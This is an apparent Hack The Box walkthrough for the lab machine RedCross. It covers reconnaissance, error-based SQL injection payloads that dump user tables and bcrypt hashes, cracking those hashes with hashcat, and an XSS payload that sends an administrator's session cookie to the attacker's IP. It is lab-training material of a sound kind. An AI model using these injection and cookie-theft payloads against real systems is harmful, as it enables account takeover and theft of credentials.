# Hack the Box - RedCross
```CSS
Machine IP: 10.10.10.113 - Debian
```
## Reconnaisance
**Disover all open TCP ports**
```CSS
▶ nmap -Pn -sS -p- 10.10.10.113 -T4 --min-rate 1000 -oN nmap.surface
```

**Identify and scan running services on open ports**
```CSS
▶ sudo nmap -sV -sC -p 22,80,443 10.10.10.113 -oN nmap.deep 
```

---

## Application Mapping
![image](https://user-images.githubusercontent.com/83878909/229340988-396c149d-59a9-44df-8bb8-846e1a2e6f3b.png)

---

### Directory Brute-Force
```CSS
▶ gobuster dir --url https://intra.redcross.htb --wordlist /usr/share/wordlists/directories.txt --no-tls-validation --threads 25 --output intra-dir.out
```
![image](https://user-images.githubusercontent.com/83878909/229342980-9b448de6-1f32-417a-915b-d419ef3afc08.png)

### Recursive Directory Brute-Force
```CSS
▶ gobuster dir --url https://intra.redcross.htb/pages --wordlist Common-PHP-Filenames.txt --no-tls-validation --threads 25 --output intra-dir-pages.out 
```
![image](https://user-images.githubusercontent.com/83878909/229349757-4437bdf3-24b6-4b47-aa87-b392ff82f9da.png)

### Recursive Directory Brute-Force
```CSS
▶ gobuster dir --url https://intra.redcross.htb/documentation --wordlist directory-list-2.3-small.txt --no-tls-validation  --threads 25 --output intra-dir-pages.out --extensions pdf,txt 
```
![image](https://user-images.githubusercontent.com/83878909/229352633-afb50fcf-6b44-47a5-ad7d-327324b03a67.png)

---

## Virtual Host Brute-Force
```CSS
▶ wfuzz -H 'Host: FUZZ.redcross.htb' -u 'https://10.10.10.113' -w subdomains-top1million-5000.txt --hw 28
```
![image](https://user-images.githubusercontent.com/83878909/229351137-705a4132-e00b-45b5-b551-2f9a15acb448.png)

---

## Testing for SQL Injection
  - URL: `https://intra.redcross.htb/?page=login`
  - Capture the request in BurpSuite and copy it to a text file using `Copy to file`.
  - Run `sqlmap` with the captured request. 
![image](https://user-images.githubusercontent.com/83878909/229352907-4b619112-09b4-4d94-bb9e-af767ebf9e9a.png)
![image](https://user-images.githubusercontent.com/83878909/229352924-ffbba2d9-f739-43a1-b7fa-98c14ad39f6e.png)

### SQLMap
```CSS
▶ sqlmap -r login-request.txt --force-ssl --dbms mysql --batch
```
**Nothing Found**

---

## Testing for Default Credentials on Login Page
- Logged in as Guest.
- Working credentials: `guest:guest`.
![image](https://user-images.githubusercontent.com/83878909/229353512-1722be64-2483-4f6e-aa8c-ee2d70a9786a.png)

---

## Testing for SQL Injection
  - URL: `https://intra.redcross.htb/?page=app`
  - Capture the request in BurpSuite and copy it to a text file using `Copy to file`.
  - Run `sqlmap` with the captured request. 
![image](https://user-images.githubusercontent.com/83878909/229353680-3ca112d1-6c52-48ae-a39c-107c461459c9.png)

### SQLMap
```CSS
▶ sqlmap -r userid-filter-request.txt -p o --force-ssl --dbms mysql --batch
```
## Manual Testing
  - Inject a `'` after the `o` parameter in the query.
![image](https://user-images.githubusercontent.com/83878909/229354603-aef8edb5-23e7-40b8-8785-f45b4515d517.png)
  - Extract: Version information.
  - Query: `') and extractvalue(0x0a,concat(0x0a,version()))-- -`
![image](https://user-images.githubusercontent.com/83878909/229354803-2b283325-cc0c-4561-bceb-4a890f1a6e1d.png)
 ## Database Name 
  - Extract: Database name.
  - Query: `') and extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229359923-16a7107b-f98b-4294-8816-c672d7690dd6.png)
 ## Tables
  - Extract: Table names in the database `redcross`.
  - Query (Table 1): `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 0,1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229360263-2a8cfc98-5fb3-4d9b-ab61-71836b0aae34.png)
  - Query (Table 2): `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 1,1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229360434-d3ce41fa-586c-430a-b4f7-89549b2704e1.png)  
  - Query (Table 3): `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 2,1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229360478-52232c71-b380-404e-a649-e99f5afa4759.png)
- Tables Found: messages, requests and users.

## Columns
  - Extract: Column names in the table `users`.
  - Query (Column 1): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 0,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229364564-7f7b5fbe-e17b-4c60-b28e-e9c8b36a9e4a.png)
  - Query (Column 2): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 1,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229364190-97f1d230-b4a4-45d8-900a-50c7707eb9fd.png)
  - Query (Column 3): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 2,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229364271-a10fe1c5-7311-4d04-9c64-96141184e967.png)
  - Query (Column 4): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 3,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229364423-652f1974-229c-49b6-a88c-e6d010103f4b.png)
  - Query (Column 5): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 5,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229364516-a25c1339-8f3c-4d66-8691-251dab9d1289.png)
- Columns Found: id, username, password, mail and role.

## Usernames and Passwords
  - Extract: Usernames.
  - Query (User 1): `') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 0,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229365056-4de5f991-d941-4753-9d09-866688fd02f2.png)
  - Query (User 2): `') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 1,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229365145-8c217e2e-6269-46c4-a8c6-3eb3f79cc853.png)
  - Query (User 3): `') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 1,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229365296-3ff1f74f-2180-4c29-8111-83d82aeaebf8.png)
  - Query (User 4): `') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 1,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229365253-75ce97e6-d60d-4278-9881-9c0b5cc94add.png)
- Users Found:
  - Extract: Passwords.
  - Query: `') and extractvalue(0x0a,concat(0x0a,(select password from redcross.users LIMIT 0,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229367688-1cf32661-e990-4ac2-b893-a29fb7746b17.png)
  - The above query returned the password for user `admin` however the passqord is not complete. The SQL query needs to be modified and then the password will be returned in two parts using two different queries.
  - Query1 : (User:admin - Password) - `') and extractvalue(0x0a,concat(0x0a,(select password from redcross.users LIMIT 0,1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229367688-1cf32661-e990-4ac2-b893-a29fb7746b17.png)
  - Query2 : (User:admin - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 0,1) FROM 30)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229368328-a49d9ad2-7b8d-4023-8cc5-c77205eccbd7.png)
  - Combining Both: `$2y$10$z/d5GiwZuFqjY1jRiKIPzuPX` + `Kt0SthLOyU438ajqRBtrb7ZADpwq.` = `$2y$10$z/d5GiwZuFqjY1jRiKIPzuKt0SthLOyU438ajqRBtrb7ZADpwq.`
  - Creds: `$2y$10$z/d5GiwZuFqjY1jRiKIPzuKt0SthLOyU438ajqRBtrb7ZADpwq.`

  - Query3 : (User:penelope - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 1,1) FROM 1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229368782-66383407-b465-43b7-9538-107ad69ded4b.png)
  - Query4 : (User:penelope - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 1,1) FROM 32)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229368975-08d51824-c0de-47d1-84a0-d2b1dab60ee5.png)
  - Combining Both: `$2y$10$tY9Y955kyFB37GnW4xrC0.J.` + `FzmkrQhxD..vKCQICvwOEgwfxqgAS` = `$2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS`
  - Creds: `$2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS`

  - Query5 : (User:charles - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 2,1) FROM 1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229369088-df1b99bb-715c-4880-818f-c49a98127147.png)
  - Query6 : (User:charles - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 2,1) FROM 32)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229369140-0567522b-90ad-4848-a589-9b313197cee5.png)
  - Creds: `$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i`

  - Query5 : (User:tricia - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 3,1) FROM 1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229369626-20e036fb-d87c-470b-9d24-1df824df2309.png)
  - Query5 : (User:tricia - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 3,1) FROM 32)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229369689-f8f72344-686c-4c4f-bef1-f6b8098abe28.png)
  - Creds: `$2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r.`

  - Query5 : (User:guest - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 4,1) FROM 1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229369765-07879956-6632-461d-b8d7-3545d0b1c519.png)
  - Query5 : (User:guest - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 4,1) FROM 32)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229369808-d6c53a4e-207e-45d9-ac72-c0ee947107e6.png)
  - Creds: `$2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi`

## Crack Hashes
```CSS
▶ hashcat -m 3200 --username hashes.txt /usr/share/wordlists/rockyou.txt
```
- hashes.txt
![image](https://user-images.githubusercontent.com/83878909/229371164-25bf449a-6810-411a-bdbd-f2b3fe813133.png)

- cracked password: `cookiemonster` for user `charles`.

---

## Application Testing
  - Directory brute-force revealed that this file is accessible: `https://intra.redcross.htb/documentation/account-signup.pdf`
![image](https://user-images.githubusercontent.com/83878909/229372282-95685fde-0b1f-407f-ac77-efb0404774c0.png)
  - Found link: `https://intra.redcross.htb/?page=contact`
![image](https://user-images.githubusercontent.com/83878909/229372360-0d319e37-2cf6-4cd9-94f8-3e61f7a63b5a.png)
  - Fill (added another parameter `password`)and Submit the form.
![image](https://user-images.githubusercontent.com/83878909/229372427-a3b10ae4-d13b-46ff-bff1-cde415463213.png)
![image](https://user-images.githubusercontent.com/83878909/229372475-489e8dc4-7ec2-469e-8497-0b102c63473f.png)
  - Adding the parameter `password` returned the credentials `guest:guest`.

---

## Testing for XSS
  - Tring to fetch a `session-cookie`.
  - Testing all fields in the form.
  - Payload - `<script>document.write('<img src="http://10.10.14.34/nothing.gif?cookie' + document.cookie + '"/>)</script>"'`.
![image](https://user-images.githubusercontent.com/83878909/229376092-d0719df1-6bae-45e8-b4db-d38dba64f633.png)
![image](https://user-images.githubusercontent.com/83878909/229376168-0d6dd946-f4d5-4141-9896-62da0d832fde.png)
  - Session-Cookie: `9cvn6v8fh74bv8h6bql20dlt27` and Domain is `admin`.
---

## Vhost Application
![image](https://user-images.githubusercontent.com/83878909/229376279-739ef964-6d88-4623-b437-8fbf417f2a8e.png)
  - Replace the session-cookie.
  - Access to `Admin Panel`.
![image](https://user-images.githubusercontent.com/83878909/229376623-800edb13-7be8-4481-bd76-7376e723f077.png)
  - Add User
![image](https://user-images.githubusercontent.com/83878909/229376917-4614aa30-b6cb-4fd4-a9b0-66f683d5a1fd.png)
![image](https://user-images.githubusercontent.com/83878909/229376940-2c6ab779-e6a3-47e0-b205-c931ea4aa5d3.png)
  - Creds: `random:UxNCeFVf`
  - SSH: Login allowed using the credentials. However, no information of interest was found.
![image](https://user-images.githubusercontent.com/83878909/229377057-fdc012c7-e75e-4ea1-87b2-d999e1b49d31.png)
  - Network Firewall: Whitelisted attacker IP.

---

## NMAP (After Whitelisting IP)
```CSS
▶ nmap -sC -sV 10.10.10.113 -oN nmap.whitelist

Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 01:54 IST                                        [0/1]
Nmap scan report for redcross.htb (10.10.10.113)
Host is up (0.089s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.0.8 or later
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 67d385f8eeb8062359d7758ea237d0a6 (RSA)
|   256 89b465271f93721abce3227090db3596 (ECDSA)
|_  256 66bda11c327432e2e664e8a5251b4d67 (ED25519)
80/tcp   open  http        Apache httpd 2.4.25
|_http-title: Did not follow redirect to https://intra.redcross.htb/
|_http-server-header: Apache/2.4.25 (Debian)
443/tcp  open  ssl/http    Apache httpd 2.4.25
|_http-title: Did not follow redirect to https://intra.redcross.htb/
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
| Not valid before: 2018-06-03T19:46:58
|_Not valid after:  2021-02-27T19:46:58
|_http-server-header: Apache/2.4.25 (Debian)
1025/tcp open  NFS-or-IIS?
5432/tcp open  postgresql  PostgreSQL DB 9.6.7 - 9.6.12
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=redcross.redcross.htb
| Subject Alternative Name: DNS:redcross.redcross.htb
| Not valid before: 2018-06-03T19:13:20
|_Not valid after:  2028-05-31T19:13:20
Service Info: Host: RedCross; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 182.51 seconds
```
